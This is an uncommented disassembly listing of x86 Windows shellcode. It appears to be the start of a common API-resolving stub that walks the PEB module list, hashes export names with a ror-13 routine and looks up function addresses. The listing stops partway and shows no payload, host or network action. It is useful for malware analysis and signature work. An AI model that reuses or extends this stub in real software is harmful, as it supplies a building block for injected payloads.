  0:	fc                   	cld    
   1:	e8 89 00 00 00       	call   0x8f 
   6:	60                   	pusha  
   7:	89 e5                	mov    ebp,esp 
   9:	31 d2                	xor    edx,edx 
   b:	64 8b 52 30          	mov    edx,DWORD PTR fs:[edx+0x30] 
   f:	8b 52 0c             	mov    edx,DWORD PTR [edx+0xc] 
  12:	8b 52 14             	mov    edx,DWORD PTR [edx+0x14] 
  15:	8b 72 28             	mov    esi,DWORD PTR [edx+0x28] 
  18:	0f b7 4a 26          	movzx  ecx,WORD PTR [edx+0x26] 
  1c:	31 ff                	xor    edi,edi 
  1e:	31 c0                	xor    eax,eax 
  20:	ac                   	lods   al,BYTE PTR ds:[esi] 
  21:	3c 61                	cmp    al,0x61 
  23:	7c 02                	jl     0x27 
  25:	2c 20                	sub    al,0x20 
  27:	c1 cf 0d             	ror    edi,0xd 
  2a:	01 c7                	add    edi,eax 
  2c:	e2 f0                	loop   0x1e 
  2e:	52                   	push   edx 
  2f:	57                   	push   edi 
  30:	8b 52 10             	mov    edx,DWORD PTR [edx+0x10] 
  33:	8b 42 3c             	mov    eax,DWORD PTR [edx+0x3c] 
  36:	01 d0                	add    eax,edx 
  38:	8b 40 78             	mov    eax,DWORD PTR [eax+0x78] 
  3b:	85 c0                	test   eax,eax 
  3d:	74 4a                	je     0x89 
  3f:	01 d0                	add    eax,edx 
  41:	50                   	push   eax 
  42:	8b 48 18             	mov    ecx,DWORD PTR [eax+0x18] 
  45:	8b 58 20             	mov    ebx,DWORD PTR [eax+0x20] 
  48:	01 d3                	add    ebx,edx 
  4a:	e3 3c                	jecxz  0x88 
  4c:	49                   	dec    ecx 
  4d:	8b 34 8b             	mov    esi,DWORD PTR [ebx+ecx*4] 
  50:	01 d6                	add    esi,edx 
  52:	31 ff                	xor    edi,edi 
  54:	31 c0                	xor    eax,eax 
  56:	ac                   	lods   al,BYTE PTR ds:[esi] 
  57:	c1 cf 0d             	ror    edi,0xd 
  5a:	01 c7                	add    edi,eax 
  5c:	38 e0                	cmp    al,ah 
  5e:	75 f4                	jne    0x54 
  60:	03 7d f8             	add    edi,DWORD PTR [ebp-0x8] 
  63:	3b 7d 24             	cmp    edi,DWORD PTR [ebp+0x24] 
  66:	75 e2                	jne    0x4a 
  68:	58                   	pop    eax 
  69:	8b 58 24             	mov    ebx,DWORD PTR [eax+0x24] 
  6c:	01 d3                	add    ebx,edx 
  6e:	66 8b 0c 4b          	mov    cx,WORD PTR [ebx+ecx*2] 
  72:	8b 58 1c             	mov    ebx,DWORD PTR [eax+0x1c] 
  75:	01 d3                	add    ebx,edx 
  77:	8b 04 8b             	mov    eax,DWORD PTR [ebx+ecx*4] 
  7a:	01 d0                	add    eax,edx 
  7c:	89 44 24 24          	mov    DWORD PTR [esp+0x24],eax 
  80:	5b                   	pop    ebx 
  81:	5b                   	pop    ebx 
  82:	61                   	popa   
  83:	59                   	pop    ecx 
  84:	5a                   	pop    edx 
  85:	51                   	push   ecx 
